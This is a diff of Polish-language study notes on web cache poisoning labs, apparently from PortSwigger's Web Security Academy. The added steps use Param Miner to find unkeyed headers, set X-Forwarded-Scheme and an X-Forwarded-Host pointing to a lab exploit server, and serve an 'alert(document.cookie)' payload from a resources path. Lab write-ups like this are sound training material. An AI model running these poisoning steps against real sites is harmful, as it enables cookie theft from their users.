@@ -1,3 +1,8 @@
+param miner:
+nowe cache buster in cachekey (GET /?cb=1)
+cache: miss
+ 
+ <hr>
  Żądania GET
  <br>
 Tak, żądania GET są zwykle cache’owane.
@@ -201,8 +206,38 @@ Lab: Web cache poisoning with multiple headers <br>
 Scheme to start url i mowi, czy to będzie http czy ftp czy https
 x-forwarded-scheme: nohttps
 
+bo nohttps dają 302, a https 200.
 tip: żeby testować czy xfs się cachuje, musimy alterowac GET (xfs jest unkeyed) 
 
 <br>
 
 4.Second skan: x-forwarded-scheme: nohttps> Miss>Skan param miner > guess header : x-forwarded-scheme: 
+Znaleziony drugi nagłówek
+
+<img width="764" height="523" alt="image" src="https://github.com/user-attachments/assets/f6ebc9c3-6710-422c-a28b-6af8c45a9a60" />
+
+<br>
+
+5. new /?cb=6
+X-Forwarded-Host: exploit-0a11008604ffa19d80ac4d970137004d.exploit-server.net
+body exploit server:
+alert(document.cookie);
+file: resources path
+browsre lab/?cb=6
+
+<br>
+
+6. GET change to /resources path
+
+<hr>
+
+
+Lab: Targeted web cache poisoning using an unknown header
+
+1. GET /cb=1
+resp: miss
+param miner . guess header
+x-host:
+
+<br>
+
